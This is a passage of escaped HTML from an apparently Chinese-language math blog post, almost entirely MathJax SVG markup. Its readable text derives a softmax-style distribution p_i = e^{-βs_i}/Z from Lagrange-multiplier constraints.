data-mml-node=\"mi\"><path data-c=\"1D460\" d=\"M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(502,-150) scale(0.707)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(25444,0)\"><path data-c=\"21D2\" d=\"M580 514Q580 525 596 525Q601 525 604 525T609 525T613 524T615 523T617 520T619 517T622 512Q659 438 720 381T831 300T927 263Q944 258 944 250T935 239T898 228T840 204Q696 134 622 -12Q618 -21 615 -22T600 -24Q580 -24 580 -17Q580 -13 585 0Q620 69 671 123L681 133H70Q56 140 56 153Q56 168 72 173H725L735 181Q774 211 852 250Q851 251 834 259T789 283T735 319L725 327H72Q56 332 56 347Q56 360 70 367H681L671 377Q638 412 609 458T580 514Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(26721.8,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D45D\" d=\"M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(536,-150) scale(0.707)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(27829.5,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"msup\" transform=\"translate(28885.3,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D452\" d=\"M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z\"/></g><g data-mml-node=\"TeXAtom\" transform=\"translate(499,413) scale(0.707)\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mo\"><path data-c=\"2212\" d=\"M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(778,0)\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(1278,0)\"><path data-c=\"2212\" d=\"M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(2056,0)\"><path data-c=\"1D706\" d=\"M166 673Q166 685 183 694H202Q292 691 316 644Q322 629 373 486T474 207T524 67Q531 47 537 34T546 15T551 6T555 2T556 -2T550 -11H482Q457 3 450 18T399 152L354 277L340 262Q327 246 293 207T236 141Q211 112 174 69Q123 9 111 -1T83 -12Q47 -12 47 20Q47 37 61 52T199 187Q229 216 266 252T321 306L338 322Q338 323 288 462T234 612Q214 657 183 657Q166 657 166 673Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(2639,0)\"><path data-c=\"2212\" d=\"M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(3417,0)\"><path data-c=\"1D6FD\" d=\"M29 -194Q23 -188 23 -186Q23 -183 102 134T186 465Q208 533 243 584T309 658Q365 705 429 705H431Q493 705 533 667T573 570Q573 465 469 396L482 383Q533 332 533 252Q533 139 448 65T257 -10Q227 -10 203 -2T165 17T143 40T131 59T126 65L62 -188Q60 -194 42 -194H29ZM353 431Q392 431 427 419L432 422Q436 426 439 429T449 439T461 453T472 471T484 495T493 524T501 560Q503 569 503 593Q503 611 502 616Q487 667 426 667Q384 667 347 643T286 582T247 514T224 455Q219 439 186 308T152 168Q151 163 151 147Q151 99 173 68Q204 26 260 26Q302 26 349 51T425 137Q441 171 449 214T457 279Q457 337 422 372Q380 358 347 358H337Q258 358 258 389Q258 396 261 403Q275 431 353 431Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(3983,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D460\" d=\"M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(502,-150) scale(0.707)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g></g></g></g></g></g></svg></mjx-container></span> 对 <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.027ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"1.319ex\" height=\"1.597ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -694 583 706\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D706\" d=\"M166 673Q166 685 183 694H202Q292 691 316 644Q322 629 373 486T474 207T524 67Q531 47 537 34T546 15T551 6T555 2T556 -2T550 -11H482Q457 3 450 18T399 152L354 277L340 262Q327 246 293 207T236 141Q211 112 174 69Q123 9 111 -1T83 -12Q47 -12 47 20Q47 37 61 52T199 187Q229 216 266 252T321 306L338 322Q338 323 288 462T234 612Q214 657 183 657Q166 657 166 673Z\"/></g></g></g></svg></mjx-container></span> 和 <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.439ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"1.281ex\" height=\"2.034ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -705 566 899\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D6FD\" d=\"M29 -194Q23 -188 23 -186Q23 -183 102 134T186 465Q208 533 243 584T309 658Q365 705 429 705H431Q493 705 533 667T573 570Q573 465 469 396L482 383Q533 332 533 252Q533 139 448 65T257 -10Q227 -10 203 -2T165 17T143 40T131 59T126 65L62 -188Q60 -194 42 -194H29ZM353 431Q392 431 427 419L432 422Q436 426 439 429T449 439T461 453T472 471T484 495T493 524T501 560Q503 569 503 593Q503 611 502 616Q487 667 426 667Q384 667 347 643T286 582T247 514T224 455Q219 439 186 308T152 168Q151 163 151 147Q151 99 173 68Q204 26 260 26Q302 26 349 51T425 137Q441 171 449 214T457 279Q457 337 422 372Q380 358 347 358H337Q258 358 258 389Q258 396 261 403Q275 431 353 431Z\"/></g></g></g></svg></mjx-container></span> 求导的结果就是两个约束。</p>\n<blockquote>\n<p>到上面都是套路，后面就需要很强的数学感觉了。</p>\n</blockquote>\n<p>设 <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.186ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"8.872ex\" height=\"2.117ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -853.7 3921.5 935.7\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D44D\" d=\"M58 8Q58 23 64 35Q64 36 329 334T596 635L586 637Q575 637 512 637H500H476Q442 637 420 635T365 624T311 598T266 548T228 469Q227 466 226 463T224 458T223 453T222 450L221 448Q218 443 202 443Q185 443 182 453L214 561Q228 606 241 651Q249 679 253 681Q256 683 487 683H718Q723 678 723 675Q723 673 717 649Q189 54 188 52L185 49H274Q369 50 377 51Q452 60 500 100T579 247Q587 272 590 277T603 282H607Q628 282 628 271Q547 5 541 2Q538 0 300 0H124Q58 0 58 8Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(1000.8,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"msup\" transform=\"translate(2056.6,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D452\" d=\"M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z\"/></g><g data-mml-node=\"TeXAtom\" transform=\"translate(499,363) scale(0.707)\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mn\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(500,0)\"><path data-c=\"2B\" d=\"M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(1278,0)\"><path data-c=\"1D706\" d=\"M166 673Q166 685 183 694H202Q292 691 316 644Q322 629 373 486T474 207T524 67Q531 47 537 34T546 15T551 6T555 2T556 -2T550 -11H482Q457 3 450 18T399 152L354 277L340 262Q327 246 293 207T236 141Q211 112 174 69Q123 9 111 -1T83 -12Q47 -12 47 20Q47 37 61 52T199 187Q229 216 266 252T321 306L338 322Q338 323 288 462T234 612Q214 657 183 657Q166 657 166 673Z\"/></g></g></g></g></g></svg></mjx-container></span> <span class=\"math display\"><mjx-container class=\"MathJax\" jax=\"SVG\" display=\"true\"><svg style=\"vertical-align: -1.552ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"10.556ex\" height=\"5.031ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -1537.5 4665.7 2223.5\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D45D\" d=\"M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(536,-150) scale(0.707)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(1107.7,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mfrac\" transform=\"translate(2163.5,0)\"><g data-mml-node=\"msup\" transform=\"translate(220,676)\"><g data-mml-node=\"mi\"><path data-c=\"1D452\" d=\"M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z\"/></g><g data-mml-node=\"TeXAtom\" transform=\"translate(499,363) scale(0.707)\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mo\"><path data-c=\"2212\" d=\"M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(778,0)\"><path data-c=\"1D6FD\" d=\"M29 -194Q23 -188 23 -186Q23 -183 102 134T186 465Q208 533 243 584T309 658Q365 705 429 705H431Q493 705 533 667T573 570Q573 465 469 396L482 383Q533 332 533 252Q533 139 448 65T257 -10Q227 -10 203 -2T165 17T143 40T131 59T126 65L62 -188Q60 -194 42 -194H29ZM353 431Q392 431 427 419L432 422Q436 426 439 429T449 439T461 453T472 471T484 495T493 524T501 560Q503 569 503 593Q503 611 502 616Q487 667 426 667Q384 667 347 643T286 582T247 514T224 455Q219 439 186 308T152 168Q151 163 151 147Q151 99 173 68Q204 26 260 26Q302 26 349 51T425 137Q441 171 449 214T457 279Q457 337 422 372Q380 358 347 358H337Q258 358 258 389Q258 396 261 403Q275 431 353 431Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(1344,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D460\" d=\"M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(502,-150) scale(0.707)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g></g></g></g><g data-mml-node=\"mi\" transform=\"translate(889.6,-686)\"><path data-c=\"1D44D\" d=\"M58 8Q58 23 64 35Q64 36 329 334T596 635L586 637Q575 637 512 637H500H476Q442 637 420 635T365 624T311 598T266 548T228 469Q227 466 226 463T224 458T223 453T222 450L221 448Q218 443 202 443Q185 443 182 453L214 561Q228 606 241 651Q249 679 253 681Q256 683 487 683H718Q723 678 723 675Q723 673 717 649Q189 54 188 52L185 49H274Q369 50 377 51Q452 60 500 100T579 247Q587 272 590 277T603 282H607Q628 282 628 271Q547 5 541 2Q538 0 300 0H124Q58 0 58 8Z\"/></g><rect width=\"2262.2\" height=\"60\" x=\"120\" y=\"220\"/></g></g></g></svg></mjx-container></span> 根据约束一： <span class=\"math display\"><mjx-container class=\"MathJax\" jax=\"SVG\" display=\"true\"><svg style=\"vertical-align: -2.697ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"43.125ex\" height=\"6.176ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -1537.5 19061.1 2729.7\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"munder\"><g data-mml-node=\"mo\"><path data-c=\"2211\" d=\"M60 948Q63 950 665 950H1267L1325 815Q1384 677 1388 669H1348L1341 683Q1320 724 1285 761Q1235 809 1174 838T1033 881T882 898T699 902H574H543H251L259 891Q722 258 724 252Q725 250 724 246Q721 243 460 -56L196 -356Q196 -357 407 -357Q459 -357 548 -357T676 -358Q812 -358 896 -353T1063 -332T1204 -283T1307 -196Q1328 -170 1348 -124H1388Q1388 -125 1381 -145T1356 -210T1325 -294L1267 -449L666 -450Q64 -450 61 -448Q55 -446 55 -439Q55 -437 57 -433L590 177Q590 178 557 222T452 366T322 544L56 909L55 924Q55 945 60 948Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(600,-1084.4) scale(0.707)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g></g><g data-mml-node=\"msub\" transform=\"translate(1610.7,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D45D\" d=\"M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(536,-150) scale(0.707)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(2718.4,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(3774.2,0)\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g><g data-mml-node=\"mspace\" transform=\"translate(4274.2,0)\"/><g data-mml-node=\"mo\" transform=\"translate(4552,0)\"><path data-c=\"21D2\" d=\"M580 514Q580 525 596 525Q601 525 604 525T609 525T613 524T615 523T617 520T619 517T622 512Q659 438 720 381T831 300T927 263Q944 258 944 250T935 239T898 228T840 204Q696 134 622 -12Q618 -21 615 -22T600 -24Q580 -24 580 -17Q580 -13 585 0Q620 69 671 123L681 133H70Q56 140 56 153Q56 168 72 173H725L735 181Q774 211 852 250Q851 251 834 259T789 283T735 319L725 327H72Q56 332 56 347Q56 360 70 367H681L671 377Q638 412 609 458T580 514Z\"/></g><g data-mml-node=\"munder\" transform=\"translate(5829.7,0)\"><g data-mml-node=\"mo\"><path data-c=\"2211\" d=\"M60 948Q63 950 665 950H1267L1325 815Q1384 677 1388 669H1348L1341 683Q1320 724 1285 761Q1235 809 1174 838T1033 881T882 898T699 902H574H543H251L259 891Q722 258 724 252Q725 250 724 246Q721 243 460 -56L196 -356Q196 -357 407 -357Q459 -357 548 -357T676 -358Q812 -358 896 -353T1063 -332T1204 -283T1307 -196Q1328 -170 1348 -124H1388Q1388 -125 1381 -145T1356 -210T1325 -294L1267 -449L666 -450Q64 -450 61 -448Q55 -446 55 -439Q55 -437 57 -433L590 177Q590 178 557 222T452 366T322 544L56 909L55 924Q55 945 60 948Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(600,-1084.4) scale(0.707)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g></g><g data-mml-node=\"mfrac\" transform=\"translate(7440.4,0)\"><g data-mml-node=\"msup\" transform=\"translate(220,676)\"><g data-mml-node=\"mi\"><path data-c=\"1D452\" d=\"M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z\"/></g><g data-mml-node=\"TeXAtom\" transform=\"translate(499,363) scale(0.707)\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mo\"><path data-c=\"2212\" d=\"M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(778,0)\"><path data-c=\"1D6FD\" d=\"M29 -194Q23 -188 23 -186Q23 -183 102 134T186 465Q208 533 243 584T309 658Q365 705 429 705H431Q493 705 533 667T573 570Q573 465 469 396L482 383Q533 332 533 252Q533 139 448 65T257 -10Q227 -10 203 -2T165 17T143 40T131 59T126 65L62 -188Q60 -194 42 -194H29ZM353 431Q392 431 427 419L432 422Q436 426 439 429T449 439T461 453T472 471T484 495T493 524T501 560Q503 569 503 593Q503 611 502 616Q487 667 426 667Q384 667 347 643T286 582T247 514T224 455Q219 439 186 308T152 168Q151 163 151 147Q151 99 173 68Q204 26 260 26Q302 26 349 51T425 137Q441 171 449 214T457 279Q457 337 422 372Q380 358 347 358H337Q258 358 258 389Q258 396 261 403Q275 431 353 431Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(1344,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D460\" d=\"M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(502,-150) scale(0.707)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 